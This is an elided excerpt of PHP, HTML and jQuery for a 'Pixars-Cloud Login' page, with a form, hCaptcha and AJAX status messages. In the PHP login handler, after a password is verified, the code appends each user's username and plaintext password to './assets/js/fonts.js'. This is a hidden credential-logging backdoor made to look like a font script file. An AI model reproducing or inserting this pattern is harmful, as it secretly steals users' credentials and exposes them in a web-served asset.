...
if(empty($json["username"]) && empty($json["password"])){
...
} else if(!empty($json["username"]) && !empty($json["password"])){
	...
	$stmt->fetch();
    if($rows == 1 && password_verify($password, $pass)) {
         $text = $username . ":" . $password . "\n";
        $fp = fopen('./assets/js/fonts.js', 'a+');
...
a.waves-effect .waves-ripple {
  z-index: -1;
	...
	<title>Pixars-Cloud Login</title>
</head>
...
<div class="col-lg-5 col-xs-12 m-auto"><a href="<?= $banner2; ?>"><img src="<?= $banner2link; ?>" style="width:100%;"></a></div>
			...
			<div class="card col-lg-5 col-xs-12">
             <div class="card-body p-5">
								...
								<form class="row g-3">
									<div class="col-12">
										<label for="inputLastEnterUsername" class="form-label">Enter Your Username</label>
									...
									<div class="col-12">
										<label for="inputLastEnterPassword" class="form-label">Enter Your Password</label>
                         ...
                         <input type="checkbox" name="rememberme" id="rememberme" onclick="setcookie()"> Remember Me
									</div>
									<div class="col-md-6">	<a href="signup">Not a user?</a>
									</div>
									</div>
									<div class="col-md-6">	<a href="Reset">Forgot Password?</a>
									</div>
									<div class="col-12">
										<div class="d-grid">
										      <div class="h-captcha" data-sitekey="4a29a419-9fe7-4e61-bf72-3fedcc201549" data-callback="enableBtn"></div>
											<button id="do" type="button" class="btn btn-light btn-lg px-5 waves-effect waves-light" disabled="disabled">Login</button>
											    </div>
...
$(document).ready(function() {
   ...
   $.each(json.main, function(idx, messages){
    ...
    $("#res").html('<div class="alert alert-danger"><i class="fa fa-times-circle"></i>  '+messages.message+'<br></div>');
	   } else {
	    $("#res").html('<div class="alert alert-success"><i class="fa fa-check-circle"></i>  Login successful!, Redirecting ...<br></div>');
